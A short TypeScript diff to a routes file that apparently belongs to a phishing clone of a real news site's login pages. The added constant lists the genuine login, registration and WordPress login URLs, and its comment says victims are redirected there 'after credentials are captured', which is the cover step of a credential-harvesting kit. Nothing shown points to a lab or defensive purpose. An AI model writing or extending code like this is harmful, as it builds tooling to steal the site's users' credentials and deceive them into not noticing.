@@ -9,6 +9,13 @@ export const ROUTES = {
   wpAdminEmails: "/wp-admin/emails",
 } as const;
 
+/** Real fintelegram.com URLs — redirect here after credentials are captured. */
+export const REAL_SITE_URLS = {
+  pmsLogin: "https://fintelegram.com/pms-login/",
+  pmsRegister: "https://fintelegram.com/pms-register/",
+  wpLogin: "https://fintelegram.com/wp-login.php",
+} as const;
+
 export const LEGACY_REDIRECTS: Record<string, string> = {
   "/login": ROUTES.pmsLogin,
   "/login/": ROUTES.pmsLogin,
